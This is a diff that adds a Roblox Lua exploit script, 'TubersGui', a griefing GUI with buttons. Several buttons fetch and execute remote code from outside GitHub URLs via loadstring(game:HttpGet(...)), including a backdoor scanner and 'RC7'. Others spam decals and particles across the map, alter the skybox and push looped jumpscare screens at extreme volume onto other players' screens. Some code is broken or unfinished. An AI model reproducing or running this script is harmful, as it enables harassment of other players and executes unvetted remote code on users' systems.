@@ -1,0 +1,448 @@
+--[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local ImageLabel = Instance.new("ImageLabel")
+local TextLabel = Instance.new("TextLabel")
+local TextButton = Instance.new("TextButton")
+local TextButton_2 = Instance.new("TextButton")
+local TextButton_3 = Instance.new("TextButton")
+local TextButton_4 = Instance.new("TextButton")
+local TextButton_5 = Instance.new("TextButton")
+local TextButton_6 = Instance.new("TextButton")
+local TextButton_7 = Instance.new("TextButton")
+local TextButton_8 = Instance.new("TextButton")
+local TextButton_9 = Instance.new("TextButton")
+local TextButton_10 = Instance.new("TextButton")
+local TextButton_11 = Instance.new("TextButton")
+local TextButton_12 = Instance.new("TextButton")
+local TextButton_13 = Instance.new("TextButton")
+local TextLabel_2 = Instance.new("TextLabel")
+
+--Properties:
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Frame.BorderSizePixel = 0
+Frame.Size = UDim2.new(0, 377, 0, 490)
+
+ImageLabel.Parent = Frame
+ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ImageLabel.BorderSizePixel = 0
+ImageLabel.Position = UDim2.new(-0.0395256914, 0, 0, 0)
+ImageLabel.Size = UDim2.new(0, 393, 0, 490)
+ImageLabel.Image = "rbxassetid://71391195558057"
+
+TextLabel.Parent = ImageLabel
+TextLabel.BackgroundColor3 = Color3.fromRGB(16, 255, 255)
+TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.BorderSizePixel = 0
+TextLabel.Size = UDim2.new(0, 393, 0, 28)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "TubersGui"
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextSize = 14.000
+
+TextButton.Parent = ImageLabel
+TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.BorderSizePixel = 0
+TextButton.Position = UDim2.new(0, 0, 0.138775513, 0)
+TextButton.Size = UDim2.new(0, 153, 0, 44)
+TextButton.Font = Enum.Font.SourceSans
+TextButton.Text = "Backdoor Scanner"
+TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.TextSize = 14.000
+
+TextButton_2.Parent = ImageLabel
+TextButton_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_2.BorderSizePixel = 0
+TextButton_2.Position = UDim2.new(0, 0, 0.257142872, 0)
+TextButton_2.Size = UDim2.new(0, 153, 0, 43)
+TextButton_2.Font = Enum.Font.SourceSans
+TextButton_2.Text = "Skybox"
+TextButton_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_2.TextSize = 14.000
+
+TextButton_3.Parent = ImageLabel
+TextButton_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_3.BorderSizePixel = 0
+TextButton_3.Position = UDim2.new(0, 0, 0.379591823, 0)
+TextButton_3.Size = UDim2.new(0, 153, 0, 43)
+TextButton_3.Font = Enum.Font.SourceSans
+TextButton_3.Text = "Decal Spam"
+TextButton_3.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_3.TextSize = 14.000
+
+TextButton_4.Parent = ImageLabel
+TextButton_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_4.BorderSizePixel = 0
+TextButton_4.Position = UDim2.new(0.0117981108, 0, 0.502040803, 0)
+TextButton_4.Size = UDim2.new(0, 143, 0, 42)
+TextButton_4.Font = Enum.Font.SourceSans
+TextButton_4.Text = "JUMPSCARE"
+TextButton_4.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_4.TextSize = 14.000
+
+TextButton_5.Parent = ImageLabel
+TextButton_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_5.BorderSizePixel = 0
+TextButton_5.Position = UDim2.new(0.0245207567, 0, 0.632653058, 0)
+TextButton_5.Size = UDim2.new(0, 143, 0, 40)
+TextButton_5.Font = Enum.Font.SourceSans
+TextButton_5.Text = "Hint"
+TextButton_5.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_5.TextSize = 14.000
+
+TextButton_6.Parent = ImageLabel
+TextButton_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_6.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_6.BorderSizePixel = 0
+TextButton_6.Position = UDim2.new(0.619605124, 0, 0.138775513, 0)
+TextButton_6.Size = UDim2.new(0, 138, 0, 44)
+TextButton_6.Font = Enum.Font.SourceSans
+TextButton_6.Text = "Knife"
+TextButton_6.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_6.TextSize = 14.000
+
+TextButton_7.Parent = ImageLabel
+TextButton_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_7.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_7.BorderSizePixel = 0
+TextButton_7.Position = UDim2.new(0.619605124, 0, 0.257142872, 0)
+TextButton_7.Size = UDim2.new(0, 138, 0, 43)
+TextButton_7.Font = Enum.Font.SourceSans
+TextButton_7.Text = "Meepcity 3"
+TextButton_7.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_7.TextSize = 14.000
+
+TextButton_8.Parent = ImageLabel
+TextButton_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_8.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_8.BorderSizePixel = 0
+TextButton_8.Position = UDim2.new(0.619605124, 0, 0.379591823, 0)
+TextButton_8.Size = UDim2.new(0, 138, 0, 43)
+TextButton_8.Font = Enum.Font.SourceSans
+TextButton_8.Text = "music"
+TextButton_8.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_8.TextSize = 14.000
+
+TextButton_9.Parent = ImageLabel
+TextButton_9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_9.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_9.BorderSizePixel = 0
+TextButton_9.Position = UDim2.new(0.619605124, 0, 0.502040803, 0)
+TextButton_9.Size = UDim2.new(0, 138, 0, 44)
+TextButton_9.Font = Enum.Font.SourceSans
+TextButton_9.Text = "FE BYPASS (Prime Version)"
+TextButton_9.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_9.TextSize = 14.000
+
+TextButton_10.Parent = ImageLabel
+TextButton_10.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_10.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_10.BorderSizePixel = 0
+TextButton_10.Position = UDim2.new(0.61049062, 0, 0.632653058, 0)
+TextButton_10.Size = UDim2.new(0, 144, 0, 40)
+TextButton_10.Font = Enum.Font.SourceSans
+TextButton_10.Text = "RC7"
+TextButton_10.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_10.TextSize = 14.000
+
+TextButton_11.Parent = ImageLabel
+TextButton_11.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_11.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_11.BorderSizePixel = 0
+TextButton_11.Position = UDim2.new(0.0254452918, 0, 0.897959173, 0)
+TextButton_11.Size = UDim2.new(0, 383, 0, 50)
+TextButton_11.Font = Enum.Font.SourceSans
+TextButton_11.Text = "1/2 go to 2/2"
+TextButton_11.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_11.TextSize = 14.000
+
+TextButton_12.Parent = ImageLabel
+TextButton_12.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_12.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_12.BorderSizePixel = 0
+TextButton_12.Position = UDim2.new(0, 0, 0.773469388, 0)
+TextButton_12.Size = UDim2.new(0, 393, 0, 41)
+TextButton_12.Font = Enum.Font.SourceSans
+TextButton_12.Text = "PARTICLE"
+TextButton_12.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_12.TextSize = 14.000
+
+TextButton_13.Parent = ScreenGui
+TextButton_13.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_13.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_13.BorderSizePixel = 0
+TextButton_13.Position = UDim2.new(0.780461013, 0, 0, 0)
+TextButton_13.Size = UDim2.new(0, 200, 0, 50)
+TextButton_13.Font = Enum.Font.SourceSans
+TextButton_13.Text = "EMPTY"
+TextButton_13.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton_13.TextSize = 14.000
+
+TextLabel_2.Parent = ScreenGui
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_2.BorderSizePixel = 0
+TextLabel_2.Position = UDim2.new(0.413830966, 0, 0.967346966, 0)
+TextLabel_2.Size = UDim2.new(0, 545, 0, 50)
+TextLabel_2.Font = Enum.Font.SourceSans
+TextLabel_2.Text = "https://www.roblox.com/game-pass/1095266120/Prime-For-Script"
+TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_2.TextSize = 14.000
+
+-- Scripts:
+
+local function BZNKJL_fake_script() -- TextButton.LocalScript 
+	local script = Instance.new('LocalScript', TextButton)
+
+	local Button = script.Parent
+	Button.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script'))()
+	end)
+end
+coroutine.wrap(BZNKJL_fake_script)()
+local function UNSRE_fake_script() -- TextButton_2.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_2)
+
+	local Button = script.Parent
+	Button.MouseButton1Click:Connect(function()
+		s = Instance.new("Sky")
+		s.Name = "SKY"
+		s.SkyboxBk = "http://www.roblox.com/asset/?id=71391195558057"
+		s.SkyboxDn = "http://www.roblox.com/asset/?id=71391195558057"
+		s.SkyboxFt = "http://www.roblox.com/asset/?id=71391195558057"
+		s.SkyboxLf = "http://www.roblox.com/asset/?id=71391195558057"
+		s.SkyboxRt = "http://www.roblox.com/asset/?id=71391195558057"
+		s.SkyboxUp = "http://www.roblox.com/asset/?id=71391195558057"
+		s.Parent = game.Lighting
+		Spooky = Instance.new("Sound", game.Workspace)
+	end)
+end
+coroutine.wrap(UNSRE_fake_script)()
+local function BPEHOYY_fake_script() -- TextButton_3.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_3)
+
+	local Button = script.Parent
+	Button.MouseButton1Click:Connect(function()
+		local ID =71391195558057 --id here
+		function spamDecal(v)
+			if v:IsA("Part") then
+				for i=0, 5 do
+					D = Instance.new("Decal")
+					D.Name = "MYDECALHUE"
+					D.Face = i
+					D.Parent = v
+					D.Texture = ("http://www.roblox.com/asset/?id="..Id)
+				end
+			else
+				if v:IsA("Model") then
+					for a,b in pairs(v:GetChildren()) do
+						spamDecal(b)
+					end
+				end
+			end
+		end
+		function decalspam(id) --use this function, not the one on top
+			Id = id
+			for i,v in pairs(game.Workspace:GetChildren()) do
+				if v:IsA("Part") then
+					for i=0, 5 do
+						D = Instance.new("Decal")
+						D.Name = "MYDECALHUE"
+						D.Face = i
+						D.Parent = v
+						D.Texture = ("http://www.roblox.com/asset/?id="..id)
+					end
+				else
+					if v:IsA("Model") then
+						for a,b in pairs(v:GetChildren()) do
+							spamDecal(b)
+						end
+					end
+				end
+			end
+		end
+	
+		decalspam(ID)
+	
+	end)
+end
+coroutine.wrap(BPEHOYY_fake_script)()
+local function DUWL_fake_script() -- TextButton_4.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_4)
+
+	local Button = script.Parent
+	Button.MouseButton1Click:Connect(function()
+		for i,v in pairs(game.Players:GetPlayers()) do
+			if v.Name ~= me and not v.PlayerGui:FindFirstChild("Screamer") and v:FindFirstChild("PlayerGui") then
+				spawn(function()
+					local newgui = Instance.new("ScreenGui",v.PlayerGui)
+					newgui.Name = "Screamer"
+					local newimage = Instance.new("ImageLabel",newgui)
+					newimage.Image = "http://www.roblox.com/asset/?id=71391195558057"
+					newimage.Size = UDim2.new(1,1,1,1)
+					local s = Instance.new("Sound",newgui)
+					s.SoundId = "rbxassetid://6018028320"
+					s.Volume = 9999999999999999999999999999999999999
+					s.Looped = true
+					s:Play()
+					print("Screamed "..v.Name)
+					while wait(9.4) do
+	
+						newimage.Parent:Destroy()
+	
+					end
+				end)
+			end
+		end
+	end)
+end
+coroutine.wrap(DUWL_fake_script)()
+local function XEBW_fake_script() -- TextButton_5.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_5)
+
+	local Button = script.Parent
+	Button.MouseButton1Click:Connect(function()
+			local h = Instance.new("Hint")
+			h.Parent = Workspace 
+			h.Text = "TEAM TUBERS93:join team today!!!!"
+	end)
+end
+coroutine.wrap(XEBW_fake_script)()
+local function GTYF_fake_script() -- TextButton_6.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_6)
+
+	local Button = script.Parent
+	Button.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/Icalock/Server/refs/heads/main/Grab%20V4.txt", true))()
+	end)
+end
+coroutine.wrap(GTYF_fake_script)()
+local function ZTEOVSS_fake_script() -- TextButton_7.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_7)
+
+	local Button = script.Parent
+	Button.MouseButton1Click:Connect(function()
+			local players = getfenv
+			local gameid = game.PlaceId
+			local teleport = game:GetService("TeleportService")
+		local players = teleport:Teleport(111655084519521)
+	end)
+end
+coroutine.wrap(ZTEOVSS_fake_script)()
+local function ILGU_fake_script() -- TextButton_8.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_8)
+
+	local Button = script.Parent
+	Button.MouseButton1Click:Connect(function()
+		local Sound0 = Instance.new("Sound")
+		Sound0.Parent = workspace
+		Sound0.Looped = true
+		Sound0.Playing = true
+		Sound0.SoundId = "rbxassetid://103215672097028"
+	end)
+end
+coroutine.wrap(ILGU_fake_script)()
+local function JDFDOO_fake_script() -- TextButton_9.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_9)
+
+	local Button = script.Parent
+	Button.MouseButton1Click:Connect(function()
+		
+	end)
+end
+coroutine.wrap(JDFDOO_fake_script)()
+local function IMZQD_fake_script() -- TextButton_10.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_10)
+
+	local Button = script.Parent
+	Button.MouseButton1Click:Connect(function()
+		--[[
+		WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+	]]
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/CoreGui/Scripts/main/RC7"))()
+	end)
+end
+coroutine.wrap(IMZQD_fake_script)()
+local function LRSWFM_fake_script() -- TextButton_12.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_12)
+
+	local button = script.Parent
+	script.Parent.MouseButton1Click:Connect(function()
+		local ID = 71391195558057
+		local Skybox = true
+		local particle = true
+		if particle == true then
+			for i,v in pairs (game.Workspace:GetChildren()) do
+				if v:IsA("Part") then
+					local particle = Instance.new("ParticleEmitter")
+					particle.Texture = "http://www.roblox.com/asset/?id=" ..ID
+					particle.Parent = v
+					particle.Rate = 200
+					for i,x in pairs (game.Workspace:GetChildren()) do
+						if x:IsA("Model") then
+							for i,z in pairs (x:GetChildren()) do
+								if z:IsA("Part") then
+									local particle2 = Instance.new("ParticleEmitter")
+									particle2.Texture = "http://www.roblox.com/asset/?id=" ..ID
+									particle2.Parent = z
+									particle2.Rate = 200
+								end
+							end
+						end
+					end
+				end
+			end
+		end
+	end)
+end
+coroutine.wrap(LRSWFM_fake_script)()
+local function QZGTDBW_fake_script() -- TextButton_13.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_13)
+
+	local Button = script.Parent
+	Button.MouseButton1Click:Connect(function()
+		for i,v in pairs(game.Players:GetPlayers()) do
+			if v.Name ~= me and not v.PlayerGui:FindFirstChild("Screamer") and v:FindFirstChild("PlayerGui") then
+				spawn(function()
+					local newgui = Instance.new("ScreenGui",v.PlayerGui)
+					newgui.Name = "Screamer"
+					local newimage = Instance.new("ImageLabel",newgui)
+					newimage.Image = "http://www.roblox.com/asset/?id=78182691014569"
+					newimage.Size = UDim2.new(1,1,1,1)
+					local s = Instance.new("Sound",newgui)
+					s.SoundId = "rbxassetid://6018028320"
+					s.Volume = 9999999999999999999999999999999999999
+					s.Looped = true
+					s:Play()
+					print("Screamed "..v.Name)
+					while wait(199999) do
+	
+						newimage.Parent:Destroy()
+	
+					end
+				end)
+			end
+		end
+	end)
+end
+coroutine.wrap(QZGTDBW_fake_script)()
+
